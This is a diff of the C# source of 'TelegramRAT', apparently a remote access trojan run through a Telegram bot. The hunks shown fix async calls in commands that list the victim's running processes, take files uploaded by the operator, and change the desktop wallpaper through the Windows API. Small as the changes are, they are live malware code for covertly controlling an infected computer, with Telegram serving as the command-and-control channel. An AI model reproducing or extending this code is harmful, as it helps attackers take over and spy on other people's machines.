@@ -38,7 +38,6 @@ namespace TelegramRAT
 
         static void Main(string[] args)
         {
-
             string thisprocessname = Process.GetCurrentProcess().ProcessName;
 
             if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
@@ -347,7 +346,7 @@ namespace TelegramRAT
                         string Concat = "List of processes: \n";
                         int i = 1;
                         Process[] processCollection = Process.GetProcesses();
-
+                        
                         foreach (Process p in processCollection)
                         {
                             
@@ -715,9 +714,10 @@ namespace TelegramRAT
                         }
                         else
                         {
-                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help upload to get info about this command!", replyToMessageId: update.Message.MessageId);
+                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help upload to get info about this command!", replyToMessageId: update.Message.MessageId);
                             return;
                         }
+                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                     }
                     catch (Exception ex)
                     {
@@ -832,7 +832,7 @@ namespace TelegramRAT
 
             });
 
-            //CHANGE WALLPAPER
+            //WALLPAPER
             CommandsList.Add(new BotCommand
             {
                 Command = "/wallpaper",
@@ -849,7 +849,7 @@ namespace TelegramRAT
                                 using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                 {
                                     Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
-                                    await Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs);
+                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
                                 }
                             }
                             else if (update.Message.Type == MessageType.Document)
@@ -857,7 +857,7 @@ namespace TelegramRAT
                                 using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                 {
                                     Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.Document.FileId);
-                                    await Bot.DownloadFileAsync(wallpaperFile.FilePath, fs);
+                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
                                 }
                             }
                             else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Photo)
@@ -865,7 +865,7 @@ namespace TelegramRAT
                                 using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                 {
                                     Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.ReplyToMessage.Photo.Last().FileId);
-                                    await Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs);
+                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
                                 }
                             }
                             else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
@@ -873,16 +873,16 @@ namespace TelegramRAT
                                 using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                 {
                                     Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId);
-                                    await Bot.DownloadFileAsync(wallpaperFile.FilePath, fs);
+                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
                                 }
                             }
                             else
                             {
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: update.Message.MessageId);
+                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: update.Message.MessageId);
                                 return;
                             }
-
-                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
+                            
+                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                             await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                         }
                         catch (Exception ex)
